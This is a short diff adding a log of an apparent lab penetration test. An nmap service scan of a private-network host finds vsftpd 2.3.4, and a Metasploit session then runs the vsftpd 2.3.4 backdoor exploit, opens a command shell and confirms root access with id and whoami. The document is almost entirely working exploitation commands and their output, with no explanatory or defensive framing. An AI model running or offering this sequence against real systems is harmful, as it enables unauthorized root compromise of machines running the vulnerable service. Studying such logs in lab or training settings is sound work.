@@ -1,0 +1,31 @@
+# Nmap scan against target machine
+$ nmap -sV -p 21,80,443 192.168.1.200
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-06-15 16:00 IST
+Nmap scan report for 192.168.1.200
+Host is up (0.0015s latency).
+
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 2.3.4
+80/tcp  open  http    Apache httpd 2.4.41
+443/tcp open  ssl/http Apache httpd 2.4.41
+
+Service info: OS: Unix
+
+# Metasploit payload execution log
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.200
+RHOSTS => 192.168.1.200
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.1.200:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.1.200:21 - USER: 331 Please specify the password.
+[+] 192.168.1.200:21 - Backdoor service has been spawned, handling...
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.1.100:4444 -> 192.168.1.200:6200)
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+
